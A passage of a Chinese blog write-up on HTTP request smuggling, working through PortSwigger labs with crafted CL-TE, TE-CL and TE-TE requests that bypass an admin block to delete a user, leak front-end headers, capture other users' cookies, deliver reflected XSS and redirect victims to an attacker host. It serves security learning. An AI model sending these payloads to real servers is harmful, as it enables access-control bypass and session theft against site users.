<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>
<p>这时候用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。</p>
<h2 id="2-5-CL-TE"><a href="#2-5-CL-TE" class="headerlink" title="2.5 CL-TE"></a>2.5 CL-TE</h2><p>两个<code>Content-Length</code>这种请求包对于服务器的要求还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在<code>RFC2616</code>的第4.4节中，规定:<strong>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</strong>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回<code>400</code>错误。服务器在这里的实现更容易出问题。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc2616#section-4.4">https://tools.ietf.org/html/rfc2616#section-4.4</a></p>
</blockquote>
<p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p>
<p>Lab 地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac761f1a1e9fe92e80372867004e0068.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Cookie: session&#x3D;fblq0y8FiGcc5K6mSs2HTdfWzGRhTjgz</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>连续发送几次请求就可以获得该响应。<br><img src="http://image.v0w.top/2020/12/16082046342269.jpg" alt="CL-TE"></p>
<p>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>a</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ac761f1a1e9fe92e80372867004e0068.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>服务器在解析时当然会产生报错了。</p>
<h2 id="2-6-TE-CL"><a href="#2-6-TE-CL" class="headerlink" title="2.6 TE-CL"></a>2.6 TE-CL</h2><p>所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p>
<p>Lab地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac7f1f571fe9f64580263276002a0013.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;GklnleINICe4bVWmOboLzzums1ppdes2</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>可以在这里设置<strong>是否自动更新</strong>，我们在测试HTTPsmuggling的时候往往需要关闭Content-Length的自动更新。<br><img src="http://image.v0w.top/2020/12/16082713958441.jpg" alt="取消自动更新Content-Length"></p>
<p><img src="http://image.v0w.top/2020/12/16082714994032.jpg" alt="TE-CL"></p>
<p>由于前端服务器处理<code>Transfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>成功报错。</p>
<h2 id="2-7-TE-TE"><a href="#2-7-TE-TE" class="headerlink" title="2.7 TE-TE"></a>2.7 TE-TE</h2><p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
<p>Lab地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac991f181e14509a80e729a500980063.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;CopStl0xBmPNLqkRBoRYmmr48VDokDv3</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: anyinvaild</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x&#x3D;1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="http://image.v0w.top/2020/12/16082721386354.jpg" alt="TE-TE"></p>
<h1 id="0x03-攻击方式-amp-危害"><a href="#0x03-攻击方式-amp-危害" class="headerlink" title="0x03 攻击方式&amp;危害"></a>0x03 攻击方式&amp;危害</h1><h2 id="3-1-bypass-front-end-security-controls-portswigger"><a href="#3-1-bypass-front-end-security-controls-portswigger" class="headerlink" title="3.1 bypass front-end security controls-portswigger"></a>3.1 bypass front-end security controls-portswigger</h2><p>这里提供了两个实验环境，一个是 CL-TE 形式的 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a> ，一个是TE-CL 形式的 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>，两个实验最终达到的目的一样，这里我们随便选用 CL-TE 的来进行实验。</p>
<blockquote>
<p> This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it.</p>
<p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</p>
</blockquote>
<p>架构和之前提到是CL-TE实验一样，只不过这次我们需要去利用 HTTP Smuggling 获取 admin 权限并删除 carlos 用户。</p>
<p>我们生成 LAB 之后，直接访问<code>/admin</code>会发现 <code>&quot;Path /admin is blocked&quot;</code>，看来不能通过正常方式访问<code>/admin</code>，或者是有什么限制，但是我们不知道限制是什么。那我们尝试 HTTP Smuggling 的方式，发送如下数据包两次，就能看到限制是什么：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acbd1fa91ed6894e8031d60d00f5009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;B1AUoiKqAaOP8ipBE9Vf5d2pAxm7ToxS</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="http://image.v0w.top/2020/12/16082734980370.jpg" alt="smuggling看安全限制"></p>
<p>增加<code>Host: localhost</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acbd1fa91ed6894e8031d60d00f5009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;B1AUoiKqAaOP8ipBE9Vf5d2pAxm7ToxS</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 45</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: localhost\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="http://image.v0w.top/2020/12/16082737690822.jpg" alt="发现删除的接口"><br>构造删除接口，删除carlos账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acbd1fa91ed6894e8031d60d00f5009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Cookie: session&#x3D;B1AUoiKqAaOP8ipBE9Vf5d2pAxm7ToxS</span><br><span class="line">Content-Type: text&#x2F;html; application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET &#x2F;admin&#x2F;delete?username&#x3D;carlos HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: localhost\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="http://image.v0w.top/2020/12/16082753625634.jpg" alt="删除成功"></p>
<p>这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\r\n                            --&gt; POST data需要空一行，不计数</span><br><span class="line">0\r\n                           --&gt; 3个字节</span><br><span class="line">\r\n                            --&gt; 2个字节</span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1\r\n         --&gt; 19+2 &#x3D; 21 个字节</span><br><span class="line">\r\n                            --&gt; 2个字节</span><br><span class="line">所以这么结算下来就是 3+2+21+2 &#x3D; 28字节。</span><br></pre></td></tr></table></figure>
<p>TE-CL 的情况类似，这里就不再重复举例了。</p>
<h2 id="3-2-Revealing-Front-end-Request-Rewriting-portswigger"><a href="#3-2-Revealing-Front-end-Request-Rewriting-portswigger" class="headerlink" title="3.2 Revealing Front-end Request Rewriting-portswigger"></a>3.2 Revealing Front-end Request Rewriting-portswigger</h2><blockquote>
<p> 在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p>
<ul>
<li>描述TLS连接所使用的协议和密码</li>
<li>包含用户IP地址的XFF头</li>
<li>用户的会话令牌ID</li>
</ul>
<p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p>
<ul>
<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
</ul>
</blockquote>
<p>有时候 Front 服务器会给转发的请求添加一些请求头再转发给 Backend 服务器，我们可以利用 HTTP Smuggling 的方式来泄露这些请求头。同样我们借助 LAB 来实践理解：<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p>
<p>There’s an admin panel at /admin, but it’s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the X-Forwarded-For header but has a different name.</p>
<p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p>
</blockquote>
<p>这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果”123”直接回显到了相应当中。<br><img src="http://image.v0w.top/2020/12/16082772709116.jpg"><br>尝试使用 HTTP Smuggling 方式访问，但是被 blocked ：<br><img src="http://image.v0w.top/2020/12/16082775478694.jpg" alt="HTTP Smuggling-Blocked"><br>然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc61fe41f553ac880ba439700060035.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: session&#x3D;LyaWdPjtN9GYWViLvsbQ8go6gAqSMJLZ</span><br><span class="line">Content-Length: 103</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">search&#x3D;123</span><br></pre></td></tr></table></figure>

<p><img src="http://image.v0w.top/2020/12/16082785120473.jpg" alt="Reveal HTTP request"><br>很神奇！对吧！那么为什么呢？<br><strong>插一句原理</strong><br>这是如何获取的呢，可以从我们构造的数据包来入手，可以看到，我们走私过去的请求为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">search&#x3D;123</span><br></pre></td></tr></table></figure>
<p>其中Content-Length的值为99，显然下面携带的数据的长度是不够99的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达99时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这时实际拼接的请求是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">search&#x3D;123POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">X-txptGX-Ip: 58.32.7.15</span><br><span class="line">Host: acc61fe41f553ac880ba439700060035.web-secu</span><br></pre></td></tr></table></figure>
<p>又因为这个web的功能会将search变量的内容打印回显，于是就可以回显request-header了。</p>
<p><strong>我们继续：</strong></p>
<p>这里还有一个技巧，我们直接添加<code>X-txptGX-Ip: 127.0.0.1</code>这个header，还是没法请求出来<br><img src="http://image.v0w.top/2020/12/16082794234377.jpg"></p>
<p>这是因为我们伪造的<code>X-txptGX-Ip</code>被服务器加上的<code>X-txptGX-Ip</code>覆盖掉了，我们可以利用上面提到的技巧，同样利用<code>Content-Length</code>将服务器加上的header给截断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc61fe41f553ac880ba439700060035.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: session&#x3D;LyaWdPjtN9GYWViLvsbQ8go6gAqSMJLZ</span><br><span class="line">Content-Length: 75</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">X-txptGX-Ip: 127.0.0.1</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">a&#x3D;1</span><br></pre></td></tr></table></figure>
<p><img src="http://image.v0w.top/2020/12/16082790456000.jpg" alt="/admin"></p>
<p><img src="http://image.v0w.top/2020/12/16082792494354.jpg" alt="solved"></p>
<h2 id="3-3-Capturing-other-users’-requests"><a href="#3-3-Capturing-other-users’-requests" class="headerlink" title="3.3 Capturing other users’ requests"></a>3.3 Capturing other users’ requests</h2><p>既然能拿到中间件请求，当然我们也可以尝试去拿其他用户的请求，也能拿到 Cookie 等，LAB 地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">Lab: Exploiting HTTP request smuggling to capture other users’ requests</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p>
<p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account.</p>
</blockquote>
<p>原理也比较简单，我们可以找到一个发评论的地方，然后利用评论处进行 HTTP Smuggling，例如，我们可以构造以下请求包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc51fba1f95d19a80172e4f007d00cb.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;icN18J6eM0IZS64G9YqaeGjb45KyTpjq</span><br><span class="line">Content-Length: 272</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;post&#x2F;comment HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 999</span><br><span class="line">Cookie: session&#x3D;icN18J6eM0IZS64G9YqaeGjb45KyTpjq</span><br><span class="line"></span><br><span class="line">csrf&#x3D;6DZBJoDtpC8hMUB5c5YggKCPBxdPY328&amp;postId&#x3D;2&amp;name&#x3D;vow&amp;email&#x3D;1111%40qq.com&amp;website&#x3D;http%3A%2F%2Fv0w.top&amp;comment&#x3D;V0W</span><br></pre></td></tr></table></figure>
<p><img src="http://image.v0w.top/2020/12/16086195688708.jpg" alt="burp"></p>
<p><img src="http://image.v0w.top/2020/12/16086195839134.jpg" alt="result"></p>
<p>可以看到我们可以smuggle别人的HTTP请求，如果CL足够长，我们可以获取别人的cookie。但是实测发现这个实验可能不是很好抓到别人的cookie，我抓的还是自己的。。。<br>当我CL调整到2000之后，又容易出<code>Internal Server Error</code>的报错。但是这个攻击方式的原理应该还是比较好理解的。</p>
<h2 id="3-4-Exploit-Reflected-XSS"><a href="#3-4-Exploit-Reflected-XSS" class="headerlink" title="3.4 Exploit Reflected XSS"></a>3.4 Exploit Reflected XSS</h2><p>这个利用场景可能比较受限，也比较少见，但是如果存在 HTTP Smuggling &amp; reflected XSS ，我们就可以利用这个组合拳 XSS 拿到别人的 cookie</p>
<p>Lab地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p>
<p>The application is also vulnerable to <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/reflected">reflected XSS</a> via the User-Agent header.</p>
<p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes alert(1).</p>
</blockquote>
<p>还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，但是单这样没什么用，所以我们得想点办法升级危害。<br><img src="http://image.v0w.top/2020/12/16086209284386.jpg" alt="XSS"><br>如果我们利用smuggle，然后请求中，其他用户访问的时候，就可以扩大触发面和攻击面。<br><img src="http://image.v0w.top/2020/12/16086212206652.jpg" alt="smuggle+XSS"><br><img src="http://image.v0w.top/2020/12/16086213488265.jpg" alt="show"></p>
<p>利用smuggle+XSS进行攻击，请求一次，然后任意访问站内路径，都可以触发XSS。</p>
<h2 id="3-5-Turn-An-On-Site-Redirect-Into-An-Open-Redirect"><a href="#3-5-Turn-An-On-Site-Redirect-Into-An-Open-Redirect" class="headerlink" title="3.5 Turn An On-Site Redirect Into An Open Redirect"></a>3.5 Turn An On-Site Redirect Into An Open Redirect</h2><p>这个其实很好理解，利用请求中修改host，例如在 Apache &amp; IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br></pre></td></tr></table></figure>
<p>我们会得到 Response :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">content-type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">location: https:&#x2F;&#x2F;normal-website.com&#x2F;</span><br><span class="line">content-length: 62</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;normal-website.com&#x2F;&quot;&gt;Moved Permanently&lt;&#x2F;a&gt;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>

<p>Smugle 之后的请求会像以下这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br></pre></td></tr></table></figure>
<p>然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>
<p>这样，受害者，也就是访问<code>/scripts/include.js</code>这个的用户，会被跳转到我们控制的 url 了。</p>
